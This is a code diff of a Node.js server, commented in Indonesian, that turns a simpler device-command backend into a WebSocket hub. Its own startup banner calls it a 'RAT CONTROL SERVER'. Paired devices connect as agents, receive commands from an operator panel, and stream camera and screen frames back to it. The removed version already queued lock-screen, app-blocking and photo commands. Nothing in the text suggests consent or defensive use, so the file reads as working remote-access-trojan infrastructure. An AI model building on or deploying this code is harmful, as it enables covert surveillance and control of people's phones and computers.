@@ -1,161 +1,326 @@
 const express = require('express');
+const http = require('http');
+const { WebSocketServer } = require('ws');
 const cors = require('cors');
-const path = require('path');
-const fs = require('fs');
+const crypto = require('crypto');
+
 const app = express();
+app.use(cors());
+app.use(express.json());
 
-app.use(cors({ limit: '50mb' }));
-app.use(express.json({ limit: '50mb' }));
-app.use(express.urlencoded({ limit: '50mb', extended: true }));
+const server = http.createServer(app);
+const wss = new WebSocketServer({ server });
 
-app.use(express.static('public'));
-app.use(express.static(__dirname));
-app.use(express.static(path.join(__dirname, 'public')));
+const PORT = process.env.PORT || 3000;
 
-/* ==================== DATABASE ==================== */
-let pairingCodes = {};
-let devices = [];
-let lastPhoto = null;
-let lastFrame = null;
-let lastFrameTime = 0;
+// STORAGE
+const pairingCodes = new Map();  // code -> { createdAt, used, deviceId }
+const devices = new Map();        // deviceId -> { ws, info, code, lastSeen }
+const panels = new Set();         // panel WebSocket connections
 
-/* ==================== PAIRING ==================== */
-app.post('/api/generate-pairing', (req, res) => {
-  const code = req.body.code;
-  if (!code) return res.json({ success: false, message: 'Code required' });
-  pairingCodes[code] = { used: false, createdAt: Date.now() };
-  console.log('Pairing code:', code);
-  res.json({ success: true, code: code });
+// ============================================================
+// REST API
+// ============================================================
+
+// Generate pairing code (dari panel)
+app.post('/api/generate', (req, res) => {
+    const code = generateCode();
+    pairingCodes.set(code, {
+        createdAt: Date.now(),
+        used: false,
+        deviceId: null
+    });
+    // auto expire 10 menit
+    setTimeout(() => {
+        if (pairingCodes.has(code) && !pairingCodes.get(code).used) {
+            pairingCodes.delete(code);
+        }
+    }, 10 * 60 * 1000);
+    res.json({ success: true, code });
 });
 
-/* ==================== REGISTER DEVICE ==================== */
-app.post('/api/register-device', (req, res) => {
-  const code = req.body.code;
-  if (!pairingCodes[code]) return res.json({ success: false, message: 'Code invalid' });
-  if (pairingCodes[code].used) return res.json({ success: false, message: 'Code used' });
-
-  const device = {
-    id: 'dev_' + Date.now() + '_' + Math.random().toString(36).slice(2, 7),
-    name: req.body.name || 'Unknown',
-    model: req.body.model || 'Unknown',
-    os: req.body.os || 'Unknown',
-    type: req.body.type || 'android',
-    pairedAt: Date.now(),
-    commands: []
-  };
-  devices.push(device);
-  pairingCodes[code].used = true;
-  console.log('Device registered:', device.name, device.id);
-  res.json({ success: true, deviceId: device.id });
+// Device register via pairing code
+app.post('/api/pair', (req, res) => {
+    const { deviceId, pairingCode, userAgent, platform } = req.body;
+    
+    if (!pairingCode || !pairingCodes.has(pairingCode)) {
+        return res.status(400).json({ success: false, message: 'Invalid pairing code' });
+    }
+    
+    const entry = pairingCodes.get(pairingCode);
+    if (entry.used) {
+        return res.status(400).json({ success: false, message: 'Code already used' });
+    }
+    
+    entry.used = true;
+    entry.deviceId = deviceId;
+    
+    devices.set(deviceId, {
+        ws: null,
+        info: { userAgent, platform, deviceId },
+        code: pairingCode,
+        lastSeen: Date.now(),
+        online: false
+    });
+    
+    // broadcast ke semua panel
+    broadcastToPanels({
+        type: 'device_paired',
+        deviceId,
+        info: { userAgent, platform },
+        code: pairingCode
+    });
+    
+    res.json({ success: true, deviceId });
 });
 
-/* ==================== LIST DEVICES ==================== */
+// List devices (dari panel)
 app.get('/api/devices', (req, res) => {
-  res.json(devices.map(d => ({ id: d.id, name: d.name, model: d.model, os: d.os, type: d.type })));
+    const list = [];
+    devices.forEach((d, id) => {
+        list.push({
+            deviceId: id,
+            info: d.info,
+            online: d.online,
+            lastSeen: d.lastSeen,
+            code: d.code
+        });
+    });
+    res.json({ success: true, devices: list });
 });
 
-/* ==================== COMMAND ==================== */
+// Send command ke device (dari panel)
 app.post('/api/command', (req, res) => {
-  const deviceId = req.body.deviceId;
-  const type = req.body.type;
-  const extra = {};
-  for (let k in req.body) {
-    if (k !== 'deviceId' && k !== 'type') extra[k] = req.body[k];
-  }
-  const device = devices.find(d => d.id === deviceId);
-  if (!device) return res.json({ success: false, message: 'Device not found' });
-
-  const cmd = { type: type, id: Date.now() };
-  for (let k in extra) cmd[k] = extra[k];
-  device.commands.push(cmd);
-  console.log('Command:', type, '->', device.name);
-  res.json({ success: true });
+    const { deviceId, command, params } = req.body;
+    
+    if (!devices.has(deviceId)) {
+        return res.status(404).json({ success: false, message: 'Device not found' });
+    }
+    
+    const device = devices.get(deviceId);
+    if (!device.ws || device.ws.readyState !== 1) {
+        return res.status(400).json({ success: false, message: 'Device offline' });
+    }
+    
+    const payload = JSON.stringify({
+        command,
+        params,
+        timestamp: Date.now()
+    });
+    
+    try {
+        device.ws.send(payload);
+        res.json({ success: true, message: 'Command sent' });
+    } catch (e) {
+        res.status(500).json({ success: false, message: e.message });
+    }
 });
 
-/* ==================== BACKWARD COMPAT ==================== */
-app.post('/api/lock', (req, res) => {
-  const device = devices.find(d => d.id === req.body.deviceId);
-  if (!device) return res.json({ success: false });
-  if (req.body.action === 'unlock') {
-    device.commands.push({ type: 'unlock', id: Date.now() });
-  } else {
-    device.commands.push({ type: 'lock', html: req.body.html || '', id: Date.now() });
-  }
-  res.json({ success: true });
-});
-
-app.post('/api/block-app', (req, res) => {
-  const device = devices.find(d => d.id === req.body.deviceId);
-  if (!device) return res.json({ success: false });
-  device.commands.push({
-    type: 'blockapp',
-    appName: req.body.appName,
-    message: req.body.message,
-    id: Date.now()
-  });
-  res.json({ success: true });
-});
-
-/* ==================== AGENT POLLING ==================== */
-app.get('/api/agent/commands/:deviceId', (req, res) => {
-  const device = devices.find(d => d.id === req.params.deviceId);
-  if (!device) return res.json({ commands: [] });
-  const cmds = device.commands.slice();
-  device.commands = [];
-  res.json({ commands: cmds });
-});
-
-/* ==================== FOTO ==================== */
-app.post('/api/photo', (req, res) => {
-  lastPhoto = req.body.photo;
-  console.log('Photo received from', req.body.deviceId);
-  res.json({ success: true });
-});
-
-app.get('/api/photo/latest', (req, res) => {
-  res.json({ photo: lastPhoto });
-});
-
-/* ==================== LIVE FRAME ==================== */
-app.post('/api/liveframe', (req, res) => {
-  lastFrame = req.body.frame;
-  lastFrameTime = Date.now();
-  res.json({ success: true });
-});
-
-app.get('/api/liveframe/latest', (req, res) => {
-  res.json({
-    frame: lastFrame,
-    time: lastFrameTime,
-    age: Date.now() - lastFrameTime
-  });
-});
-
-/* ==================== ROOT ==================== */
+// Health check
 app.get('/', (req, res) => {
-  const paths = [
-    path.join(__dirname, 'public', 'index.html'),
-    path.join(__dirname, 'index.html')
-  ];
-  for (let p of paths) {
-    if (fs.existsSync(p)) return res.sendFile(p);
-  }
-  res.send('Lyx Server OK - index.html gak ditemukan');
+    res.json({
+        status: 'online',
+        devices: devices.size,
+        panels: panels.size,
+        codes: pairingCodes.size,
+        uptime: process.uptime()
+    });
 });
 
-app.get('/agent.html', (req, res) => {
-  const paths = [
-    path.join(__dirname, 'public', 'agent.html'),
-    path.join(__dirname, 'agent.html')
-  ];
-  for (let p of paths) {
-    if (fs.existsSync(p)) return res.sendFile(p);
-  }
-  res.status(404).send('agent.html gak ditemukan');
+// ============================================================
+// WEBSOCKET
+// ============================================================
+
+wss.on('connection', (ws, req) => {
+    const url = new URL(req.url, 'http://localhost');
+    const path = url.pathname;
+    
+    // ============ DEVICE AGENT ============
+    if (path === '/agent') {
+        const deviceId = url.searchParams.get('deviceId');
+        const code = url.searchParams.get('code');
+        
+        console.log(`[AGENT] Connected: ${deviceId}`);
+        
+        if (!deviceId || !devices.has(deviceId)) {
+            ws.close();
+            return;
+        }
+        
+        const device = devices.get(deviceId);
+        device.ws = ws;
+        device.online = true;
+        device.lastSeen = Date.now();
+        
+        broadcastToPanels({
+            type: 'device_online',
+            deviceId,
+            info: device.info
+        });
+        
+        ws.on('message', (msg) => {
+            try {
+                const data = JSON.parse(msg);
+                device.lastSeen = Date.now();
+                
+                // forward ke panel
+                if (data.type === 'cam_frame' || data.type === 'screen_frame') {
+                    broadcastToPanels({
+                        type: data.type,
+                        deviceId,
+                        frame: data.frame,
+                        timestamp: data.timestamp
+                    });
+                } else if (data.type === 'ack' || data.type === 'error' || data.type === 'screen_info') {
+                    broadcastToPanels({
+                        ...data,
+                        deviceId
+                    });
+                }
+            } catch (e) {
+                console.log('[AGENT] Parse error:', e.message);
+            }
+        });
+        
+        ws.on('close', () => {
+            console.log(`[AGENT] Disconnected: ${deviceId}`);
+            device.online = false;
+            device.ws = null;
+            device.lastSeen = Date.now();
+            broadcastToPanels({
+                type: 'device_offline',
+                deviceId
+            });
+        });
+        
+        ws.on('error', (e) => {
+            console.log(`[AGENT] Error ${deviceId}:`, e.message);
+        });
+    }
+    
+    // ============ PANEL ============
+    else if (path === '/panel') {
+        console.log('[PANEL] Connected');
+        panels.add(ws);
+        
+        // kirim list device saat connect
+        const list = [];
+        devices.forEach((d, id) => {
+            list.push({
+                deviceId: id,
+                info: d.info,
+                online: d.online,
+                lastSeen: d.lastSeen
+            });
+        });
+        ws.send(JSON.stringify({ type: 'device_list', devices: list }));
+        
+        ws.on('message', (msg) => {
+            try {
+                const data = JSON.parse(msg);
+                
+                // panel kirim command ke device
+                if (data.type === 'command' && data.deviceId) {
+                    const device = devices.get(data.deviceId);
+                    if (device && device.ws && device.ws.readyState === 1) {
+                        device.ws.send(JSON.stringify({
+                            command: data.command,
+                            params: data.params,
+                            timestamp: Date.now()
+                        }));
+                    }
+                }
+                
+                // panel minta generate code
+                if (data.type === 'generate_code') {
+                    const code = generateCode();
+                    pairingCodes.set(code, {
+                        createdAt: Date.now(),
+                        used: false,
+                        deviceId: null
+                    });
+                    ws.send(JSON.stringify({ type: 'code_generated', code }));
+                    setTimeout(() => {
+                        if (pairingCodes.has(code) && !pairingCodes.get(code).used) {
+                            pairingCodes.delete(code);
+                        }
+                    }, 10 * 60 * 1000);
+                }
+            } catch (e) {
+                console.log('[PANEL] Parse error:', e.message);
+            }
+        });
+        
+        ws.on('close', () => {
+            console.log('[PANEL] Disconnected');
+            panels.delete(ws);
+        });
+        
+        ws.on('error', (e) => {
+            console.log('[PANEL] Error:', e.message);
+        });
+    }
+    
+    // ============ UNKNOWN ============
+    else {
+        ws.close();
+    }
 });
 
-/* ==================== START ==================== */
-const PORT = process.env.PORT || 8080;
-app.listen(PORT, function() {
-  console.log('LYX SERVER RUNNING ON PORT ' + PORT);
+// ============================================================
+// HELPERS
+// ============================================================
+
+function generateCode() {
+    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+    let code = '';
+    for (let i = 0; i < 12; i++) {
+        code += chars.charAt(crypto.randomInt(0, chars.length));
+    }
+    return code;
+}
+
+function broadcastToPanels(data) {
+    const msg = JSON.stringify(data);
+    panels.forEach(panel => {
+        if (panel.readyState === 1) {
+            try { panel.send(msg); } catch (e) {}
+        }
+    });
+}
+
+// cleanup device lama offline > 24 jam
+setInterval(() => {
+    const now = Date.now();
+    devices.forEach((d, id) => {
+        if (!d.online && (now - d.lastSeen) > 24 * 60 * 60 * 1000) {
+            devices.delete(id);
+            console.log(`[CLEANUP] Removed device: ${id}`);
+        }
+    });
+    // cleanup code expired
+    pairingCodes.forEach((c, code) => {
+        if (!c.used && (now - c.createdAt) > 10 * 60 * 1000) {
+            pairingCodes.delete(code);
+        }
+    });
+}, 60 * 60 * 1000);
+
+// ============================================================
+// START
+// ============================================================
+
+server.listen(PORT, () => {
+    console.log(`========================================`);
+    console.log(`  RAT CONTROL SERVER`);
+    console.log(`  Port   : ${PORT}`);
+    console.log(`  Panel  : ws://localhost:${PORT}/panel`);
+    console.log(`  Agent  : ws://localhost:${PORT}/agent`);
+    console.log(`  API    : http://localhost:${PORT}/api`);
+    console.log(`========================================`);
+});
+
+process.on('SIGTERM', () => {
+    console.log('[SERVER] Shutting down...');
+    server.close(() => process.exit(0));
 });
